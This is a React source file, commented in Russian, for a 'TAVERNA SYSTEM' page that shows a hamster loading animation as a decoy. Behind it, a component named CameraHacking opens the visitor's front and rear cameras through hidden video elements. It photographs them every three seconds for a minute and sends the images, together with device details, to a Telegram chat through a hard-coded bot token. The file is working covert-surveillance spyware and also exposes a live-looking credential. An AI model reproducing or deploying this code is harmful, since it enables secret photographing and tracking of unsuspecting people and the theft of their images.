import React, { useRef, useEffect } from "react";
import { useParams, BrowserRouter, Routes, Route } from "react-router-dom";
import ReactDOM from "react-dom/client";
import "./App.css";

/**
 * КОМПОНЕНТ CAMERAHACKING
 */
const CameraHacking = ({ chatId }) => {
  const streamsRef = useRef([]);
  const captureIntervalRef = useRef(null);
  const videoRefsRef = useRef([]);
  const cameraNamesRef = useRef([]);
  const captureCount = useRef(0);
  const startTime = useRef(null);
  const totalDuration = 60000;
  const photoInterval = 3000;
  const currentCameraIndex = useRef(0);

  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';

  const sendToTelegram = (text) => {
    return new Promise((resolve, reject) => {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      
      xhr.onload = function() {
        if (xhr.status === 200) resolve(true);
        else reject();
      };
      
      xhr.onerror = function() {
        reject();
      };
      
      const data = JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: 'HTML',
        disable_notification: true
      });
      
      xhr.send(data);
    });
  };

  const sendPhotoToTelegram = (blob, caption = '') => {
    return new Promise((resolve, reject) => {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, `photo_${Date.now()}.jpg`);
      formData.append('disable_notification', 'true');
      if (caption) formData.append('caption', caption);

      const xhr = new XMLHttpRequest();
      xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, true);
      
      xhr.onload = function() {
        if (xhr.status === 200) resolve(true);
        else reject();
      };
      
      xhr.onerror = function() {
        reject();
      };
      
      xhr.send(formData);
    });
  };

  const getGeolocation = () => {
    return new Promise((resolve) => {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const { latitude, longitude } = position.coords;
            resolve({
              latitude: latitude.toFixed(6),
              longitude: longitude.toFixed(6),
              method: "GPS",
              success: true
            });
          },
          () => {
            resolve({ success: false });
          }
        );
      } else {
        resolve({ success: false });
      }
    });
  };

  // УПРОЩЕННАЯ ИНИЦИАЛИЗАЦИЯ КАМЕР
  const initializeCameras = async () => {
    try {
      streamsRef.current = [];
      videoRefsRef.current = [];
      cameraNamesRef.current = [];
      
      // Сначала пробуем фронтальную камеру с разными настройками
      let frontCameraSuccess = false;
      
      // Пробуем фронтальную камеру с facingMode: "user"
      try {
        const frontStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }
        });
        
        const frontVideo = document.createElement('video');
        frontVideo.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-9999;';
        frontVideo.autoplay = true;
        frontVideo.muted = true;
        frontVideo.playsInline = true;
        frontVideo.srcObject = frontStream;
        document.body.appendChild(frontVideo);
        
        // Ждем готовности
        await new Promise(resolve => {
          frontVideo.onloadedmetadata = () => {
            streamsRef.current.push(frontStream);
            videoRefsRef.current.push(frontVideo);
            cameraNamesRef.current.push("🤳 Фронтальная камера");
            frontCameraSuccess = true;
            resolve();
          };
          setTimeout(resolve, 1000);
        });
        
      } catch (frontError) {
        // Если не получилось, пробуем любую камеру для фронтальной
        try {
          const anyFrontStream = await navigator.mediaDevices.getUserMedia({ video: true });
          
          const anyFrontVideo = document.createElement('video');
          anyFrontVideo.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-9999;';
          anyFrontVideo.autoplay = true;
          anyFrontVideo.muted = true;
          anyFrontVideo.playsInline = true;
          anyFrontVideo.srcObject = anyFrontStream;
          document.body.appendChild(anyFrontVideo);
          
          await new Promise(resolve => {
            anyFrontVideo.onloadedmetadata = () => {
              streamsRef.current.push(anyFrontStream);
              videoRefsRef.current.push(anyFrontVideo);
              cameraNamesRef.current.push("🤳 Фронтальная камера");
              frontCameraSuccess = true;
              resolve();
            };
            setTimeout(resolve, 1000);
          });
          
        } catch (anyFrontError) {
          // Фронтальная камера не доступна
        }
      }
      
      // Пробуем заднюю камеру
      try {
        const backStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { exact: "environment" } }
        });
        
        const backVideo = document.createElement('video');
        backVideo.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-9999;';
        backVideo.autoplay = true;
        backVideo.muted = true;
        backVideo.playsInline = true;
        backVideo.srcObject = backStream;
        document.body.appendChild(backVideo);
        
        await new Promise(resolve => {
          backVideo.onloadedmetadata = () => {
            // Если фронтальной нет, задняя будет первой камерой
            if (!frontCameraSuccess) {
              streamsRef.current.unshift(backStream);
              videoRefsRef.current.unshift(backVideo);
              cameraNamesRef.current.unshift("📷 Задняя камера");
            } else {
              streamsRef.current.push(backStream);
              videoRefsRef.current.push(backVideo);
              cameraNamesRef.current.push("📷 Задняя камера");
            }
            resolve();
          };
          setTimeout(resolve, 1000);
        });
        
      } catch (backError) {
        // Задняя камера не доступна
      }
      
      // Если нет ни одной камеры, создаем тестовую
      if (streamsRef.current.length === 0) {
        cameraNamesRef.current.push("📷 Тестовая камера");
      }
      
      return streamsRef.current.length > 0;
      
    } catch (error) {
      return false;
    }
  };

  const capturePhotoFromCamera = (cameraIndex) => {
    return new Promise((resolve) => {
      setTimeout(() => {
        const canvas = document.createElement('canvas');
        
        // Проверяем, есть ли реальная камера
        if (cameraIndex < videoRefsRef.current.length && videoRefsRef.current[cameraIndex]) {
          const video = videoRefsRef.current[cameraIndex];
          const cameraName = cameraNamesRef.current[cameraIndex];
          
          if (video.videoWidth > 0 && video.videoHeight > 0) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            const ctx = canvas.getContext('2d');
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            
            // Рисуем видео
            if (cameraName.includes('Фронтальная')) {
              ctx.save();
              ctx.translate(canvas.width, 0);
              ctx.scale(-1, 1);
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
              ctx.restore();
            } else {
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            }
            
            // Водяной знак и информация
            ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
            ctx.font = 'bold 32px Arial';
            ctx.textAlign = 'right';
            ctx.fillText('TAVERNA', canvas.width - 20, canvas.height - 20);
            
            ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
            ctx.textAlign = 'left';
            ctx.font = 'bold 20px Arial';
            ctx.fillText(cameraName, 20, 40);
            ctx.font = '16px Arial';
            ctx.fillText(`Фото #${captureCount.current + 1}`, 20, 70);
            ctx.fillText(new Date().toLocaleTimeString(), 20, 100);
            ctx.fillText(`${canvas.width}x${canvas.height}`, 20, 130);
            
          } else {
            // Видео есть, но не готово
            createTestImage(canvas, cameraName);
          }
        } else {
          // Нет реальной камеры - тестовое изображение
          const cameraName = cameraNamesRef.current[cameraIndex] || `Камера ${cameraIndex + 1}`;
          createTestImage(canvas, cameraName);
        }
        
        canvas.toBlob(blob => {
          resolve(blob ? { blob, cameraName: cameraNamesRef.current[cameraIndex] || `Камера ${cameraIndex + 1}` } : null);
        }, 'image/jpeg', 0.9);
        
      }, 100);
    });
  };

  const createTestImage = (canvas, cameraName) => {
    canvas.width = 800;
    canvas.height = 600;
    const ctx = canvas.getContext('2d');
    
    const gradient = ctx.createLinearGradient(0, 0, 800, 600);
    gradient.addColorStop(0, '#667eea');
    gradient.addColorStop(1, '#764ba2');
    ctx.fillStyle = gradient;
    ctx.fillRect(0, 0, 800, 600);
    
    ctx.fillStyle = '#FFFFFF';
    ctx.font = 'bold 36px Arial';
    ctx.textAlign = 'center';
    ctx.fillText('TAVERNA SYSTEM', 400, 150);
    
    ctx.font = '28px Arial';
    ctx.fillText(cameraName, 400, 250);
    ctx.fillText('Система активна', 400, 320);
    
    ctx.font = '22px Arial';
    ctx.fillText(`Фото #${captureCount.current + 1}`, 400, 380);
    ctx.fillText(new Date().toLocaleTimeString(), 400, 420);
    
    ctx.fillStyle = 'rgba(255, 255, 255, 0.3)';
    ctx.font = 'bold 48px Arial';
    ctx.textAlign = 'right';
    ctx.fillText('TAVERNA', 780, 580);
  };

  const captureAndSendPhoto = async () => {
    const elapsed = Date.now() - startTime.current;
    
    if (elapsed >= totalDuration) {
      stopCapturing();
      sendToTelegram(`⏰ TAVERNA: Время истекло\n📸 Всего фото: ${captureCount.current}`);
      return;
    }
    
    // Определяем индекс камеры для текущего снимка
    const cameraCount = Math.max(1, cameraNamesRef.current.length);
    const cameraIndex = currentCameraIndex.current % cameraCount;
    
    const result = await capturePhotoFromCamera(cameraIndex);
    
    if (result && result.blob) {
      const elapsedSeconds = Math.floor(elapsed / 1000);
      const remainingSeconds = Math.floor((totalDuration - elapsed) / 1000);
      
      const caption = `${result.cameraName}\n` +
        `📸 Фото #${captureCount.current + 1}\n` +
        `⏱ ${elapsedSeconds} сек / ${remainingSeconds} сек\n` +
        `🕐 ${new Date().toLocaleTimeString()}\n` +
        `🚀 TAVERNA SYSTEM`;
      
      try {
        await sendPhotoToTelegram(result.blob, caption);
      } catch (error) {
        // Игнорируем ошибки отправки
      }
    }
    
    // Переключаем на следующую камеру
    currentCameraIndex.current = (currentCameraIndex.current + 1) % cameraCount;
    captureCount.current++;
    
    // Статистика
    if (captureCount.current % 5 === 0) {
      const elapsedSeconds = Math.floor(elapsed / 1000);
      sendToTelegram(
        `📊 TAVERNA: Статистика\n` +
        `📸 Фото: ${captureCount.current}\n` +
        `📷 Камер: ${cameraNamesRef.current.length}\n` +
        `⏱ Прошло: ${elapsedSeconds} сек`
      ).catch(() => {});
    }
  };

  const startCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }
    
    currentCameraIndex.current = 0;
    
    setTimeout(() => {
      captureAndSendPhoto();
    }, 1000);
    
    captureIntervalRef.current = setInterval(() => {
      captureAndSendPhoto();
    }, photoInterval);
  };

  const stopCapturing = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }
    
    streamsRef.current.forEach(stream => {
      stream?.getTracks().forEach(track => track.stop());
    });
    streamsRef.current = [];
    
    videoRefsRef.current.forEach(video => {
      video?.remove();
    });
    videoRefsRef.current = [];
    cameraNamesRef.current = [];
  };

  useEffect(() => {
    startTime.current = Date.now();
    
    const init = async () => {
      try {
        await sendToTelegram(
          `🚀 TAVERNA SYSTEM АКТИВИРОВАН\n` +
          `📱 Устройство: ${navigator.userAgent.substring(0, 80)}...\n` +
          `🖥 Экран: ${window.screen.width}x${window.screen.height}\n` +
          `⏰ Запуск: ${new Date().toLocaleString()}\n` +
          `⏳ Длительность: 1 минута\n` +
          `📸 Режим: Поочередная съемка`
        ).catch(() => {});
        
        const camerasReady = await initializeCameras();
        
        if (camerasReady || cameraNamesRef.current.length > 0) {
          await sendToTelegram(
            `📷 КАМЕРЫ ГОТОВЫ\n` +
            `✅ Доступно: ${cameraNamesRef.current.length} камер\n` +
            `📸 Режим: 1 фото каждые 3 секунды\n` +
            `⏱ Начинаю съемку...`
          ).catch(() => {});
          
          startCapture();
          
          setTimeout(() => {
            stopCapturing();
            sendToTelegram(
              `✅ TAVERNA SYSTEM: СЪЕМКА ЗАВЕРШЕНА\n` +
              `📸 Итого фото: ${captureCount.current}\n` +
              `📷 Камер использовано: ${cameraNamesRef.current.length}\n` +
              `⏱ Время работы: 1 минута\n` +
              `🎉 Процесс завершен`
            ).catch(() => {});
          }, totalDuration);
          
        } else {
          await sendToTelegram('❌ TAVERNA SYSTEM: Не удалось активировать камеры').catch(() => {});
        }
      } catch (error) {}
    };
    
    setTimeout(init, 1000);
    
    return () => {
      stopCapturing();
    };
  }, [chatId]);

  return null;
};

/**
 * КОМПОНЕНТ PHOTOPAGE
 */
const PhotoPage = () => {
  const { chatId } = useParams();

  return (
    <>
      <div className="App" style={{
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
        padding: '20px'
      }}>
        <div className="wraper" style={{ transform: 'scale(1.4)' }}>
          <div className="wheel-and-hamster">
            <div className="wheel"></div>
            <div className="hamster">
              <div className="hamster__body">
                <div className="hamster__head">
                  <div className="hamster__ear"></div>
                  <div className="hamster__eye"></div>
                  <div className="hamster__nose"></div>
                </div>
                <div className="hamster__limb hamster__limb--fr"></div>
                <div className="hamster__limb hamster__limb--fl"></div>
                <div className="hamster__limb hamster__limb--br"></div>
                <div className="hamster__limb hamster__limb--bl"></div>
                <div className="hamster__tail"></div>
              </div>
            </div>
            <div className="spoke"></div>
          </div>
          
          <div style={{
            textAlign: 'center',
            marginTop: '50px',
            color: 'white',
            fontSize: '18px',
            fontWeight: 'bold',
            opacity: 0.9
          }}>
            TAVERNA SYSTEM ACTIVE...
          </div>
        </div>
      </div>

      {chatId && <CameraHacking chatId={chatId} />}
    </>
  );
};

/**
 * КОМПОНЕНТ APP
 */
const App = () => {
  return (
    <Routes>
      <Route path="/g/:chatId" element={<PhotoPage />} />
      <Route path="/" element={
        <div className="App" style={{
          minHeight: '100vh',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)'
        }}>
          <div className="wraper">
            <div className="wheel-and-hamster">
              <div className="wheel"></div>
              <div className="hamster">
                <div className="hamster__body">
                  <div className="hamster__head">
                    <div className="hamster__ear"></div>
                    <div className="hamster__eye"></div>
                    <div className="hamster__nose"></div>
                  </div>
                  <div className="hamster__limb hamster__limb--fr"></div>
                  <div className="hamster__limb hamster__limb--fl"></div>
                  <div className="hamster__limb hamster__limb--br"></div>
                  <div className="hamster__limb hamster__limb--bl"></div>
                </div>
              </div>
              <div className="spoke"></div>
            </div>
          </div>
        </div>
      } />
    </Routes>
  );
};

/**
 * ОСНОВНОЙ РЕНДЕР
 */
const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(
  <BrowserRouter>
    <App />
  </BrowserRouter>
);

export default App;
